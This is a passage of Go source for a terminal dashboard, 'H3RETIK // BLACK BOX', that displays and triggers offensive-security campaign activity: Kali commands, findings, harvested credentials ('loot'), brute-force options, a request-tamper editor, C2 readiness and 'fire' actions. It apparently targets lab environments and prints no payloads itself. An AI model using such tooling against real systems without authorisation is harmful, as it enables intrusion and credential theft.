			m.findingNoticeUntil = time.Now().Add(4 * time.Second)
		}
	}
	loadedLoot := loadJSONL[lootEntry](filepath.Join(m.telemetryDir, "loot.jsonl"))
	m.loot = collapseLootEvents(augmentLootWithFindings(loadedLoot, m.findings, m.state.TargetURL))
	m.exploits = loadJSONL[exploitEntry](filepath.Join(m.telemetryDir, "exploits.jsonl"))
	m.attackModules = loadAttackModules(m.root)
	m.cveTasks = discoverCVETasks(m.root)
	m.replayRuns = discoverReplayRuns(m.root)
	if !m.manualTargetMode {
		target := strings.TrimSpace(m.state.TargetURL)
		if target != "" {
			m.manualTargetInput = target
			if strings.TrimSpace(m.osintTargetInput) == "" {
				seed := strings.TrimSpace(targetHostFromURL(target))
				if seed == "" {
					seed = target
				}
				m.osintTargetInput = seed
			}
			if strings.TrimSpace(m.onchainTargetInput) == "" {
				m.onchainTargetInput = "0x0000000000000000000000000000000000000000"
			}
		}
	}
	m.syncCVETaskSelection()
	m.syncReplaySelection()
	if m.commandIdx >= len(m.commands) && len(m.commands) > 0 {
		m.commandIdx = len(m.commands) - 1
	}
	if m.findingIdx >= len(m.findings) && len(m.findings) > 0 {
		m.findingIdx = len(m.findings) - 1
	}
	if m.lootIdx >= len(m.loot) && len(m.loot) > 0 {
		m.lootIdx = len(m.loot) - 1
	}
	m.ensureCommandSelection()
	m.ensureFindingSelection()
	m.ensureLootSelection()
	if m.launchIdx >= len(m.launchActions()) {
		m.launchIdx = max(0, len(m.launchActions())-1)
	}
	if m.targetIdx >= len(m.targetActions()) {
		m.targetIdx = max(0, len(m.targetActions())-1)
	}
	if m.fireIdx >= len(m.fireActions()) {
		m.fireIdx = max(0, len(m.fireActions())-1)
	}
	if len(pipelineNames()) > 0 {
		m.firePipelineIdx = clamp(m.firePipelineIdx, 0, len(pipelineNames())-1)
	}
	if len(exploitFireGroups()) > 0 {
		m.exploitFireGroupIdx = clamp(m.exploitFireGroupIdx, 0, len(exploitFireGroups())-1)
	}
	if len(osintDeepEngines()) > 0 {
		m.osintDeepIdx = clamp(m.osintDeepIdx, 0, len(osintDeepEngines())-1)
	}
	if len(osintInputTypes()) > 0 {
		m.osintTargetTypeIdx = clamp(m.osintTargetTypeIdx, 0, len(osintInputTypes())-1)
	}
	if len(onchainInputTypes()) > 0 {
		m.onchainTargetTypeIdx = clamp(m.onchainTargetTypeIdx, 0, len(onchainInputTypes())-1)
	}
	if targets := exploitInnerTargets(findingsByMode(m.findings, "exploit"), lootByMode(m.loot, "exploit"), m.state.TargetURL); len(targets) > 0 {
		m.exploitInnerTargetIdx = clampWrap(m.exploitInnerTargetIdx, len(targets))
	} else {
		m.exploitInnerTargetIdx = 0
	}
	if options := bruteCredentialSources(); len(options) > 0 {
		m.exploitBruteCredSrcIdx = clampWrap(m.exploitBruteCredSrcIdx, len(options))
	}
	if options := bruteAuthModes(); len(options) > 0 {
		m.exploitBruteAuthModeIdx = clampWrap(m.exploitBruteAuthModeIdx, len(options))
	}
	if pairs := extractCredentialPairsFromLoot(lootByMode(m.loot, "exploit")); len(pairs) > 0 {
		m.exploitBruteLootCredIdx = clampWrap(m.exploitBruteLootCredIdx, len(pairs))
	} else {
		m.exploitBruteLootCredIdx = 0
	}
	if len(osintTaxonomyPoints) > 0 {
		m.osintTaxIdx = clamp(m.osintTaxIdx, 0, len(osintTaxonomyPoints)-1)
	}
	if m.archCollapsed == nil {
		m.archCollapsed = map[string]bool{}
	}
	exploitCommands := commandsByMode(m.commands, "exploit")
	exploitFindings := findingsByMode(m.findings, "exploit")
	exploitLoot := lootByMode(m.loot, "exploit")
	if nodes := buildExploitAttackGraph(m.state, exploitCommands, exploitFindings, exploitLoot); len(nodes) > 0 {
		m.archGraphIdx = clampWrap(m.archGraphIdx, len(nodes))
	}
	m.ensureArchGraphActionSelection()
	if nodes := exploitTaxonomyNodes(); len(nodes) > 0 {
		m.pwnedTaxIdx = clampWrap(m.pwnedTaxIdx, len(nodes))
	}
	currentMode := strings.ToLower(strings.TrimSpace(m.fireMode))
	if currentMode == "" {
		currentMode = "exploit"
	}
	if templates := m.customCommandTemplates(currentMode); len(templates) > 0 {
		m.customTemplateIdx = clamp(m.customTemplateIdx, 0, len(templates)-1)
	} else {
		m.customTemplateIdx = 0
	}
	if m.historyIdx >= len(m.historyActions()) {
		m.historyIdx = max(0, len(m.historyActions())-1)
	}
	if actions := lootFollowupActionsForSelection(m.loot, m.lootIdx, m.state.TargetURL, m.root); len(actions) > 0 {
		m.lootActionIdx = clamp(m.lootActionIdx, 0, len(actions)-1)
	} else {
		m.lootActionIdx = 0
	}
}

func (m model) View() string {
	if !m.ready {
		return "loading..."
	}
	if m.startupActive {
		return m.startupCampaignView()
	}
	if time.Now().Before(m.splashUntil) {
		return m.splashView()
	}
	return lipgloss.JoinVertical(
		lipgloss.Left,
		m.headerView(),
		m.bodyView(),
		m.footerView(),
	)
}

func (m model) headerView() string {
	title := lipgloss.NewStyle().Foreground(lipgloss.Color("204")).Bold(true).Render("H3RETIK // BLACK BOX")
	mode := "live telemetry"
	if filepath.Base(m.telemetryDir) != "telemetry" {
		mode = "replay :: " + filepath.Base(m.telemetryDir)
	}
	feed := ""
	if time.Now().Before(m.findingNoticeUntil) && strings.TrimSpace(m.findingNotice) != "" {
		feed = " :: feed " + m.findingNotice
	}
	scope := strings.ToLower(strings.TrimSpace(m.fireMode))
	if scope == "" {
		scope = "exploit"
	}
	status := lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render(
		mode + " :: scope " + strings.ToUpper(scope) + " :: " + modeOperatorProfile(scope) + " :: mode-scoped telemetry" + feed,
	)
	tabs := []string{"[ARCH]", "[OPS]", "[PWNED]", "[LOOT]", "[CTRL]"}
	var rendered []string
	for i, label := range tabs {
		style := lipgloss.NewStyle().Padding(0, 1).Foreground(lipgloss.Color("245"))
		if i == m.tab {
			style = style.Foreground(lipgloss.Color("230")).Background(lipgloss.Color("62")).Bold(true)
		}
		rendered = append(rendered, style.Render(label))
	}
	bar := lipgloss.JoinHorizontal(lipgloss.Left, title, "  ", m.spinner.View(), "  ", strings.Join(rendered, " "))
	return lipgloss.NewStyle().Padding(0, 1).Render(bar + "\n" + status)
}

func (m model) splashView() string {
	frame := m.currentSplashFrame()
	banner := lipgloss.NewStyle().Foreground(lipgloss.Color("204")).Bold(true).Render(juicetuiBanner)
	credit := lipgloss.NewStyle().Foreground(lipgloss.Color("246")).Render("by H1DR4")
	sub := lipgloss.NewStyle().Foreground(lipgloss.Color("212")).Italic(true).Render("black-box profanation observatory")
	art := lipgloss.NewStyle().Foreground(lipgloss.Color("239")).Render(frame.Art)
	box := lipgloss.NewStyle().
		Border(lipgloss.RoundedBorder()).
		BorderForeground(lipgloss.Color("99")).
		Padding(1, 2).
		Render(lipgloss.JoinVertical(lipgloss.Center, banner, credit, sub, "", art))
	return lipgloss.Place(m.width, m.height, lipgloss.Center, lipgloss.Center, box)
}

func (m model) currentSplashFrame() splashFrame {
	if len(m.splashFrames) == 0 {
		return splashFrame{
			Title:  "operator skull study",
			Source: "embedded fallback",
			Art:    fallbackASCII,
		}
	}
	phase := int((time.Now().UnixNano() / 250_000_000) % int64(len(m.splashFrames)))
	return m.splashFrames[phase]
}

func (m model) currentLoadingFrame() splashFrame {
	if len(m.loadingFrames) == 0 {
		return splashFrame{
			Title:  "operator wait loop",
			Source: "embedded fallback",
			Art:    asciiSkull,
		}
	}
	phase := int((time.Now().UnixNano() / 180_000_000) % int64(len(m.loadingFrames)))
	return m.loadingFrames[phase]
}

func (m model) bodyView() string {
	switch m.tab {
	case 0:
		return m.overviewView()
	case 1:
		return m.commandsView()
	case 2:
		return m.findingsView()
	case 4:
		return m.controlView()
	default:
		return m.lootView()
	}
}

func (m model) overviewView() string {
	leftWidth := max(36, m.width/4)
	rightWidth := m.width - leftWidth - 2
	if rightWidth < 40 {
		rightWidth = 40
	}
	mode := strings.ToLower(strings.TrimSpace(m.fireMode))
	if mode == "" {
		mode = "exploit"
	}
	scopedCommands := commandsByMode(m.commands, mode)
	scopedFindings := findingsByMode(m.findings, mode)
	scopedLoot := lootByMode(m.loot, mode)
	if strings.EqualFold(mode, "exploit") && m.archMapMode {
		return m.exploitArchMapView(leftWidth, rightWidth, scopedCommands, scopedFindings, scopedLoot)
	}
	sections := []string{"launch", "target", "fire", "history"}
	sectionBadges := make([]string, 0, len(sections))
	for i, name := range sections {
		style := lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Padding(0, 1)
		if i == m.controlSection {
			style = style.Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true).Padding(0, 1)
		}
		sectionBadges = append(sectionBadges, style.Render(strings.ToUpper(name)))
	}

	operatorArt := lipgloss.NewStyle().Foreground(lipgloss.Color("99")).Render(asciiSkull)
	kaliRoute := strings.TrimSpace(m.state.DockerTarget)
	kaliRouteMode := "explicit"
	if kaliRoute == "" {
		kaliRoute = strings.TrimSpace(m.state.TargetURL)
		kaliRouteMode = "inferred"
	}

	left := pane("[ARCH] TARGET // "+strings.ToUpper(mode)+" STATUS", strings.Join([]string{
		operatorArt,
		metricLine("operator", modeOperatorProfile(mode)),
		metricLine("lab", valueOr(m.state.LabName, "waiting")),
		metricLine("target", valueOr(m.state.TargetName, "waiting")),
		metricLine("target url", valueOr(m.state.TargetURL, "n/a")),
		metricLine("kali route", valueOr(kaliRoute, "n/a")+" ("+kaliRouteMode+")"),
		metricLine("network", valueOr(m.state.Network, "n/a")),
		metricLine("status", valueOr(m.state.Status, "idle")),
		metricLine("phase", valueOr(m.state.Phase, "waiting")),
		metricLine("updated", shortTime(m.state.LastUpdated)),
		ternary(strings.EqualFold(mode, "exploit"), "\n"+lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("campaign ratings")+"\n"+exploitCampaignRatingsBoard(scopedCommands, scopedFindings, scopedLoot, leftWidth-4), ""),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("timeline replay"),
		wrap("OPS tab -> select event -> x to replay from timeline", leftWidth-4),
		wrap("CTRL tab -> choose launch/target/fire -> enter to execute", leftWidth-4),
		wrap("latest run :: "+replayHint(m.root), leftWidth-4),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("service ledger"),
		renderServices(m.state.Services),
	}, "\n"), leftWidth, m.height-6)

	rightTopLines := []string{
		metricLine("commands", fmt.Sprintf("%d", len(scopedCommands))),
		metricLine("findings", fmt.Sprintf("%d", len(scopedFindings))),
		metricLine("loot", fmt.Sprintf("%d", len(scopedLoot))),
		metricLine("exploit logs", fmt.Sprintf("%d", len(m.exploits))),
		metricLine("critical", fmt.Sprintf("%d", countSeverity(scopedFindings, "critical"))),
		metricLine("high", fmt.Sprintf("%d", countSeverity(scopedFindings, "high"))),
		metricLine("critical escalations", fmt.Sprintf("%d", countEscalation(m.exploits, "critical"))),
		metricLine("tools", strings.Join(uniqueTools(scopedCommands), ", ")),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("tool heatmap"),
		toolHeatmap(scopedCommands, rightWidth-4),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("mission board"),
		missionBoard(m.state, scopedCommands, scopedFindings, scopedLoot, rightWidth-4),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("workflow chain"),
		modeWorkflowBoard(mode, scopedCommands, scopedFindings, scopedLoot, rightWidth-4),
	}
	if strings.EqualFold(mode, "coop") {
		readiness, score := coopReadinessSummary(scopedCommands)
		rightTopLines = append(rightTopLines,
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("c2 readiness"),
			metricLine("state", readiness),
			metricLine("score", fmt.Sprintf("%d/100 %s", score, progressBar(score, 8))),
			metricLine("steps", coopReadinessSteps(scopedCommands)),
		)
	}
	if strings.EqualFold(mode, "exploit") {
		graphNodes := buildExploitAttackGraph(m.state, scopedCommands, scopedFindings, scopedLoot)
		graphEdges := buildExploitAttackEdges(m.state, scopedCommands, scopedFindings, graphNodes)
		graphSel := clampWrap(m.archGraphIdx, max(1, len(graphNodes)))
		nodeDetail := "no graph node selected"
		if len(graphNodes) > 0 {
			nodeDetail = m.renderExploitGraphNodeDetail(graphNodes[graphSel], graphEdges, m.archGraphActionIdx, rightWidth-4)
		}
		rightTopLines = append(rightTopLines,
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("live attack graph"),
			renderExploitAttackGraphASCII(graphNodes, graphEdges, graphSel, rightWidth-4, m.archCollapsed),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("graph node detail"),
			nodeDetail,
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("attack degree map"),
			exploitAttackDegreeMap(scopedCommands, scopedFindings, scopedLoot, rightWidth-4),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("next best action"),
			nextBestActionCard(scopedCommands, scopedFindings, scopedLoot, m.state.TargetURL, rightWidth-4),
		)
	} else {
		rightTopLines = append(rightTopLines,
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("endpoint map"),
			endpointMap(scopedFindings, scopedLoot, rightWidth-4),
		)
	}
	rightTop := pane("[PWNED] CAMPAIGN SNAPSHOT :: "+strings.ToUpper(mode), strings.Join(rightTopLines, "\n"), rightWidth, max(12, (m.height-8)/2))

	rightBottom := pane("[OPS] LATEST ACTIVITY :: "+strings.ToUpper(mode), latestActivity(scopedCommands, scopedFindings, scopedLoot), rightWidth, m.height-8-max(12, (m.height-8)/2))
	return lipgloss.JoinHorizontal(lipgloss.Top, left, lipgloss.JoinVertical(lipgloss.Left, rightTop, rightBottom))
}

func (m model) exploitArchMapView(leftWidth, rightWidth int, commands []commandEntry, findings []findingEntry, loot []lootEntry) string {
	nodes := m.exploitGraphNodes()
	edges := buildExploitAttackEdges(m.state, commands, findings, nodes)
	selected := 0
	if len(nodes) > 0 {
		selected = clampWrap(m.archGraphIdx, len(nodes))
	}
	leftLines := []string{
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("live attack tree"),
		renderExploitAttackGraphASCII(nodes, edges, selected, leftWidth-4, m.archCollapsed),
	}
	rightLines := []string{
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("graph node detail"),
		"no graph node selected",
	}
	selectedRole := "EXPLORE"
	selectedActionLabel := "none"
	selectedRoleDesc := graphRoleDescription(selectedRole)
	if len(nodes) > 0 {
		rightLines[1] = m.renderExploitGraphNodeDetail(nodes[selected], edges, m.archGraphActionIdx, rightWidth-4)
		actions := m.archGraphActionsForNode(nodes[selected])
		if len(actions) > 0 {
			action := actions[clampWrap(m.archGraphActionIdx, len(actions))]
			selectedRole = graphActionRole(action)
			selectedRoleDesc = graphRoleDescription(selectedRole)
			selectedActionLabel = truncate(action.Label, 56)
		}
	}
	editStatus := statusBadge(ternary(m.archEditEnabled, "done", "idle"))
	editToken := statusBadge(ternary(m.archEditUseToken, "done", "idle"))
	selectedField := "n/a"
	selectedFieldValue := "payload must be a flat JSON object"
	if field, value, ok := m.selectedArchPayloadField(); ok {
		selectedField = field
		selectedFieldValue = value
	}
	rightLines = append(rightLines,
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("node actions"),
		metricLine("nav", "↑/↓ tree  ←/→ hierarchy  h/l collapse-expand"),
		metricLine("select", "1..9 quick-select action"),
		metricLine("trigger", "Enter preview/checks  f execute"),
		metricLine("selected action", selectedActionLabel),
		metricLine("selected role", selectedRole+" "+graphRoleBadge(selectedRole)),
		metricLine("role detail", selectedRoleDesc),
		metricLine("status", valueOr(m.archGraphStatus, ternary(m.archGraphBusy, "running", "idle"))+" "+taxonomyAnimation(m.archGraphOutcome, m.archGraphBusy, m.archGraphUntil)),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("interactive tamper editor"),
		metricLine("editor", editStatus),
		metricLine("auth hdr", editToken),
		metricLine("method", valueOr(m.archEditMethod, "PATCH")),
		metricLine("endpoint", valueOr(m.archEditEndpoint, "press e to set")),
		metricLine("payload", truncate(valueOr(strings.TrimSpace(m.archEditPayload), "press p to set"), max(24, rightWidth-14))),
		metricLine("field", selectedField+" = "+truncate(selectedFieldValue, max(18, rightWidth-22))),
		metricLine("controls", "e endpoint  p payload  [/] field  i edit value  y method  t token  (auto-load when available)"),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("last map command output"),
		renderStructuredCommandOutput(valueOr(strings.TrimSpace(m.archGraphOutput), "no graph command output yet"), rightWidth-4, m.archOutputRaw),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render("tip: tree-only map mode active; press m to exit map mode"),
	)
	if m.manualTargetMode && (strings.EqualFold(m.manualTargetKind, "arch-edit-endpoint") || strings.EqualFold(m.manualTargetKind, "arch-edit-payload") || strings.EqualFold(m.manualTargetKind, "arch-edit-field-value")) {
		rightLines = append(rightLines,
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("212")).Render("map edit input active"),
			lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Render("> "+m.manualTargetInput),
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("type value, Enter applies, Esc cancels"),
		)
	}
	return lipgloss.JoinHorizontal(
		lipgloss.Top,
		pane("[ARCH] LIVE MAP :: EXPLOIT TREE", strings.Join(leftLines, "\n"), leftWidth, m.height-6),
		paneScrolled("[ARCH] MAP DETAIL", strings.Join(rightLines, "\n"), rightWidth, m.height-6, m.commandDetailScroll),
	)
}

func (m model) commandsView() string {
	leftWidth := max(56, m.width/2)
	rightWidth := m.width - leftWidth - 2
	topHeight := max(10, (m.height-8)/3)
	bottomHeight := m.height - 6 - topHeight
	mode := strings.ToLower(strings.TrimSpace(m.fireMode))
	if mode == "" {
		mode = "exploit"
	}
	scopedCommands := commandsByMode(m.commands, mode)
	scopedFindings := findingsByMode(m.findings, mode)
	scopedLoot := lootByMode(m.loot, mode)
	order := commandDisplayOrderByMode(m.commands, mode)

	rows := []table.Row{}
	for _, idx := range order {
		entry := m.commands[idx]
		rows = append(rows, table.Row{
			shortTime(entry.Timestamp),
			truncate(entry.Phase, 12),
			truncate(entry.Tool, 10),
			truncate(entry.Status, 6),
			fmt.Sprintf("%dms", entry.DurationMS),
			truncate(entry.Command, 50),
		})
	}

	tbl := table.New(
		table.WithColumns([]table.Column{
			{Title: "Time", Width: 9},
			{Title: "Phase", Width: 12},
			{Title: "Tool", Width: 10},
			{Title: "State", Width: 7},
			{Title: "Dur", Width: 9},
			{Title: "Command", Width: max(24, leftWidth-55)},
		}),
		table.WithRows(rows),
	)
	tbl.SetWidth(max(24, leftWidth-4))
	tbl.SetHeight(max(6, m.height-8))
	tbl.SetStyles(table.Styles{
		Header:   lipgloss.NewStyle().Foreground(lipgloss.Color("212")).Bold(true).BorderStyle(lipgloss.NormalBorder()).BorderBottom(true),
		Cell:     lipgloss.NewStyle().Padding(0, 1),
		Selected: lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true),
	})
	if len(rows) > 0 {
		selectedPos := indexInOrder(order, m.commandIdx)
		if selectedPos < 0 {
			selectedPos = 0
		}
		tbl.SetCursor(clamp(selectedPos, 0, len(rows)-1))
	}

	detail := "No command telemetry yet."
	if len(scopedCommands) > 0 {
		cmd := m.commands[m.commandIdx]
		detail = strings.Join([]string{
			metricLine("scope", strings.ToUpper(mode)+" :: "+modeOperatorProfile(mode)),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("attack timeline"),
			attackTimeline(scopedCommands, rightWidth-4),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("endpoint map"),
			endpointMap(scopedFindings, scopedLoot, rightWidth-4),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("evidence pipeline"),
			evidencePipelineSummary(m.root, scopedCommands, scopedFindings, scopedLoot, rightWidth-4),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("visible target diff"),
			targetDiff(scopedCommands, scopedFindings, scopedLoot, rightWidth-4),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("tamper integrity"),
			tamperIntegrity(scopedCommands, scopedLoot, rightWidth-4),
			"",
			metricLine("phase", cmd.Phase),
			metricLine("tool", cmd.Tool),
			metricLine("status", statusBadge(cmd.Status)),
			metricLine("exit", fmt.Sprintf("%d", cmd.ExitCode)),
			metricLine("duration", fmt.Sprintf("%dms", cmd.DurationMS)),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("command"),
			wrap(cmd.Command, rightWidth-4),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("output preview"),
			wrap(cmd.OutputPreview, rightWidth-4),
		}, "\n")
	}
	if len(scopedCommands) == 0 {
		detail = loadingPanel("operator command bus idle", m.currentLoadingFrame(), rightWidth)
	}
	timelineIdx := 0
	if len(scopedCommands) > 0 && len(m.commands) > 0 && m.commandIdx >= 0 && m.commandIdx < len(m.commands) {
		timelineIdx = scopedCommandSelectionIndex(scopedCommands, m.commands[m.commandIdx])
	}
	timeline := attackTimelinePanel(scopedCommands, timelineIdx, rightWidth-4)
	if m.replayStatus != "" {
		detail = lipgloss.NewStyle().Foreground(lipgloss.Color("212")).Render(m.replayStatus) + "\n\n" + detail
	}

	return lipgloss.JoinHorizontal(
		lipgloss.Top,
		pane("[OPS] KALI COMMANDS :: "+strings.ToUpper(mode), tbl.View(), leftWidth, m.height-6),
		lipgloss.JoinVertical(
			lipgloss.Left,
			pane("[ARCH] ATTACK TIMELINE :: "+strings.ToUpper(mode), timeline, rightWidth, topHeight),
			paneScrolled("[ARCH] COMMAND DETAIL :: "+strings.ToUpper(mode), detail, rightWidth, bottomHeight, m.commandDetailScroll),
		),
	)
}

func (m model) findingsView() string {
	leftWidth := max(48, m.width/2)
	rightWidth := m.width - leftWidth - 2
	mode := strings.ToLower(strings.TrimSpace(m.fireMode))
	if mode == "" {
		mode = "exploit"
	}
	modeCommands := commandsByMode(m.commands, mode)
	order := findingDisplayOrderByMode(m.findings, mode)
	lines := []string{}
	for _, idx := range order {
		item := m.findings[idx]
		prefix := "  "
		style := lipgloss.NewStyle().Foreground(lipgloss.Color("250"))
		metaStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("242"))
		if idx == m.findingIdx {
			prefix = "▸ "
			style = lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true)
			metaStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
		}
		riskScore := fmt.Sprintf("RISK-%d", severityWeight(item.Severity))
		lines = append(lines, style.Render(fmt.Sprintf("%s%s [%s] %s", prefix, severityBadge(item.Severity), riskScore, item.Title)))
		meta := fmt.Sprintf("   [%s] %s :: %s", strings.ToUpper(truncate(item.Phase, 12)), truncate(item.Endpoint, max(18, leftWidth-28)), shortTime(item.Timestamp))
		lines = append(lines, metaStyle.Render(meta))
	}
	if len(lines) == 0 {
		lines = append(lines, loadingPanel("finding queue empty", m.currentLoadingFrame(), leftWidth-4))
	}
	leftBody := strings.Join(lines, "\n")
	leftOffset := 0
	if len(order) > 0 {
		selectedPos := indexInOrder(order, m.findingIdx)
		if selectedPos < 0 {
			selectedPos = 0
		}
		leftOffset = autoPaneScrollOffset(leftBody, m.height-6, selectedPos*2)
	}
	detail := "No findings yet."
	if len(order) > 0 && m.findingIdx >= 0 && m.findingIdx < len(m.findings) {
		f := m.findings[m.findingIdx]
		tips := nextTipsForFinding(f, m.state.TargetURL)
		action := findingFollowupAction(f, m.state.TargetURL, m.commands, m.findings, m.loot)
		actionCommand := strings.TrimSpace(action.Command)
		if actionCommand == "" {
			actionCommand = "no mapped follow-up command for this finding"
		}
		isFullyPwned := false
		if strings.EqualFold(mode, "exploit") {
			exploitStats := exploitMissionMetrics(commandsByMode(m.commands, "exploit"), findingsByMode(m.findings, "exploit"), lootByMode(m.loot, "exploit"))
			isFullyPwned = exploitStats.DoneStages >= 6
		}
		pwnedArt := lipgloss.NewStyle().Foreground(lipgloss.Color("99")).Render(fallbackASCII)
		if isFullyPwned {
			pwnedArt = lipgloss.NewStyle().Foreground(lipgloss.Color("160")).Render(pwnedSkullASCII)
		}
		opsec := actionEffectiveOpsecScore(action, modeCommands)
		detail = strings.Join([]string{
			pwnedArt,
			"",
			exploitAttackDegreeMap(m.commands, m.findings, m.loot, rightWidth-4),
			"",
			metricLine("severity", severityBadge(f.Severity)),
			metricLine("risk score", fmt.Sprintf("RISK-%d", severityWeight(f.Severity))),
			metricLine("phase", f.Phase),
			metricLine("endpoint", f.Endpoint),
			metricLine("time", shortTime(f.Timestamp)),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("evidence"),
			wrap(f.Evidence, rightWidth-4),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("impact"),
			wrap(f.Impact, rightWidth-4),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("next move"),
			renderTips(tips, rightWidth-4),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("follow-up fire command"),
			wrap(actionCommand, rightWidth-4),
			metricLine("opsec meter", opsecMeter(opsec)),
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("next best action"),
			nextBestActionCard(m.commands, m.findings, m.loot, m.state.TargetURL, rightWidth-4),
			metricLine("trigger", "Enter or f"),
			metricLine("status", valueOr(m.pwnedFireStatus, "idle")+" "+taxonomyAnimation(m.pwnedFireOutcome, m.pwnedFireBusy, m.pwnedFireUntil)),
		}, "\n")
		if out := strings.TrimSpace(m.pwnedFireOutput); out != "" {
			detail += "\n\n" + lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("last fire output") + "\n" + wrap(truncate(out, max(120, rightWidth*2)), rightWidth-4)
		}
	}
	if len(order) == 0 {
		detail = loadingPanel("waiting for first "+strings.ToUpper(mode)+" signal", m.currentLoadingFrame(), rightWidth)
	}
	return lipgloss.JoinHorizontal(
		lipgloss.Top,
		paneScrolled("[PWNED] FINDINGS :: "+strings.ToUpper(mode), leftBody, leftWidth, m.height-6, leftOffset),
		paneScrolled("[ARCH] FINDING DETAIL :: "+strings.ToUpper(mode), detail, rightWidth, m.height-6, m.findingDetailScroll),
	)
}

func (m model) lootView() string {
	if m.lootFogMode {
		return m.lootFogView()
	}
	leftWidth := max(44, m.width/2)
	rightWidth := m.width - leftWidth - 2
	order := lootDisplayOrderByMode(m.loot, m.lootOSINTMode, m.lootOnchainMode)
	lines := lootInventoryListByMode(m.loot, order, m.lootIdx, leftWidth-4, m.lootOSINTMode, m.lootOnchainMode)
	if len(lines) == 0 {
		emptyLabel := "loot locker empty"
		if m.lootOnchainMode {
			emptyLabel = "onchain loot empty"
		}
		lines = append(lines, loadingPanel(emptyLabel, m.currentLoadingFrame(), leftWidth-4))
	}
	leftBody := strings.Join(lines, "\n")
	leftOffset := 0
	if len(order) > 0 {
		selectedLine := lootListSelectedLineIndex(m.loot, order, m.lootIdx, m.lootOSINTMode, m.lootOnchainMode)
		leftOffset = autoPaneScrollOffset(leftBody, m.height-6, selectedLine)
	}
	filteredLoot := lootSubsetByOrder(m.loot, order)
	detail := "No loot yet."
	if len(order) > 0 && m.lootIdx >= 0 && m.lootIdx < len(m.loot) {
		item := m.loot[m.lootIdx]
		risk := lootRisk(item)
		tips := nextTipsForLoot(item, m.state.TargetURL)
		modeLabel := "EXPLOIT"
		if m.lootOnchainMode {
			modeLabel = "ONCHAIN"
		}
		summaryLabel := "loot summary"
		discoveryLabel := "recent discoveries"
		discoveryContent := recentLoot(filteredLoot, rightWidth-4)
		if m.lootOnchainMode {
			summaryLabel = "onchain result summary"
			discoveryLabel = "onchain results by tool"
			discoveryContent = onchainLootToolSummary(filteredLoot, rightWidth-4)
		}
		detailLines := []string{
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("inventory mode"),
			metricLine("mode", ternary(m.lootRawMode, "raw", "analysis")),
			metricLine("scope", modeLabel+" LOOT (`o` fog mission, `c` ONCHAIN scope)"),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render(summaryLabel),
			lootSummary(filteredLoot, rightWidth-4),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render(discoveryLabel),
			discoveryContent,
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("compromise board"),
			lootCompromiseMap(filteredLoot, rightWidth-4),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("risk assessment"),
			metricLine("severity", severityBadge(risk.Severity)),
			metricLine("critical issue", wrap(risk.CriticalIssue, rightWidth-18)),
			metricLine("taxonomy", risk.Taxonomy),
		}
		if m.lootOnchainMode {
			detailLines = append(detailLines,
				"",
				lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("onchain evidence stream"),
				recentLoot(filteredLoot, rightWidth-4),
				"",
			)
		} else {
			detailLines = append(detailLines,
				"",
				lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("target posture"),
				postureBadges(m.commands, m.findings, filteredLoot, rightWidth-4),
				"",
				lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("cred graph"),
				credGraph(filteredLoot, rightWidth-4),
				"",
				lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("session + creds ledger"),
				sessionLedger(filteredLoot, rightWidth-4),
				"",
			)
		}
		detailLines = append(detailLines,
			metricLine("kind", kindBadge(item.Kind)),
			metricLine("name", item.Name),
			metricLine("source", item.Source),
			metricLine("where", lootWhere(item)),
			metricLine("time", shortTime(item.Timestamp)),
			"",
